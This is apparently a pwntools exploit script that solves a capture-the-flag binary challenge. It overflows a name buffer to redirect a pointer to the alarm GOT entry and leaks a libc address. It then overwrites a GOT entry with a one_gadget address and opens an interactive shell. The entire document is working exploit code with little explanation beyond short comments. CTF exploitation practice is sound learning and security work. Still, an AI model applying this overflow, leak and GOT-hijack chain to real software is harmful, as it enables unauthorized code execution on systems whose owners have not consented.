#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def type2(size, data):
	sla(b"type: ", b"2")
	sla(b"size: ", f"{size}".encode())
	if(size):
		sa(b"data: ", data)

script = '''
# read
b *0x40153E
'''

p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)

# overwrite v2
payload = b"A" * 0xf8 + p64(exe.got['alarm'])
sa(b"name: ", payload[:0xff:])

# leak libc
type2(8, b"A" * 8) # padding to signal got
rcu(b"A" * 8)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['signal']
lleak("libc", libc_base)

# set up one gadget rsi contrainst
type2(8, p64(0)) # [rsi] = calloc_got = 0

# read_got -> one_gadget
sla(b"type: ", b"1")
one_gadget = libc_base + 0xebc88
'''
address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
sla(b"number: ", f"{one_gadget}".encode())

# trigger
type2(0, b"") # rdx = size = 0

p.interactive()
